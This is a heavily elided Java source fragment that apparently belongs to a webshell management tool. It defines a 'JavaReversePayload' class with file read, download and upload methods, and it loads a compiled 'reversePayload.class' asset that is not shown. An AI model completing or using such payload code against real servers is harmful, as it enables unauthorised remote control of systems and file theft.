...
import util.Log;
import util.ReverseReqParameter;
...
@PayloadAnnotation(
        Name = "JavaReversePayload"
)
public class JavaShellReverse implements Payload {
    ...
    public Map funMap = null;
    public Map parmaMap = null;

    public JavaShellReverse() {
    ...
    public void init(ShellEntity shellContext) {
        ...
        this.funMap = this.shell.getFunMap();
        this.parmaMap = this.shell.getParmaMap();
    }
    ...
    public String getFile(String filePath) {
        ReqParameter parameters = new ReverseReqParameter(this);
    ...
    public byte[] downloadFile(String fileName) {
        ReqParameter parameter = new ReverseReqParameter(this);
...
//        funcName = (String)this.funMap.get(funcName);
    ...
    public String bigFileUpload(String fileName, int position, byte[] content) {
        ReqParameter reqParameter = new ReverseReqParameter(this);
    ...
    public byte[] getPayload() {
        ...
        try {
            InputStream fileInputStream = JavaShell.class.getResourceAsStream("assets/reversePayload.class");
...
//    public static class ReverseReqParameter extends ReqParameter {
//        JavaShellReverse javaShellReverse;
//        public ReverseReqParameter(JavaShellReverse javaShellReverse){
//            super();
//            this.javaShellReverse = javaShellReverse;
//        }
//
//        public Parameter add(String key, byte[] value) {
//            key = (String) this.javaShellReverse.parmaMap.get(key);
...
//       byte[] aa =  functions.gzipE("11".getBytes());
//       System.out.println("as");
    JavaShellReverse j = new JavaShellReverse();
    System.out.println(new JavaShellReverse().toString());
    System.out.println(new JavaShellReverse().toString());
    }
}
